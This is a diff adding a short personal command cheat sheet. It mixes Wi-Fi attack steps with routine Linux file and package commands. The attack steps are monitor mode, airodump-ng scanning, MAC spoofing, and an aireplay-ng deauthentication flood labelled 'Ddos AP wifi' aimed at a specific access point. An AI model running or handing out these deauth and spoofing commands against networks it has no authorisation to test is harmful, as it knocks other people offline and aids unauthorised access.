@@ -1,0 +1,47 @@
+# set monitor mode:
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+
+# airmon-ng
+sudo airmon-ng start wlan0
+
+# kill services
+airmon-ng check kill
+airmon-ng check kill
+
+# airodump-ng
+airodump-ng wlan0mon
+
+# change MAC
+macchanger wlan0mon 00:11:22:33:44:55
+
+# Ddos AP wifi
+aireplay-ng --deauth 0 -a A8:58:40:FB:D3:2C -e "Pass is Pi" wlan0mon
+
+
+# Extract .deb
+
+dpkg --install /root/Downloads/rtl8192eu-dkms_4.4_all.deb
+
+# Unrar
+unrar e <filename>.rar
+
+# Check disk space
+df -h
+
+# Check Disk space of filesystem
+df -h .
+
+# Extract deb package:
+ar x example.deb
+
+# Extract deb package without installing in the system:
+dpkg -x package.deb /tmp/out
+
+#Compress
+zip -r filename.zip directory
+
+# Move / Rename files or directories
+mv old_name new_name
+
+
